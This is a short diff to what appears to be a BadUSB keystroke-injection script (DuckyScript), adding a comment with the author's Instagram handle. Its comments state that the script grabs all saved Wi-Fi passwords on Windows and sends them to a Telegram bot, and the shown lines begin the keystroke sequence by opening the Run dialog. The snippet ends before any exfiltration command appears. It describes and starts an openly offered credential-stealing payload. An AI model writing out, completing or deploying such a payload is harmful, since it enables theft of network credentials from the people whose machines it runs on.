@@ -1,4 +1,6 @@
 REM send wifi-password-to-telegram-bot-by-powershall-it's-mean-safe
+REM Reach Me Out on Instagram : @8v_3
+
 REM GRABS ALL WIFI PASSWORDS ON WINDOWS AND SENDS THEM TO A TELEGRAM BOT
 DELAY 2000
 GUI r
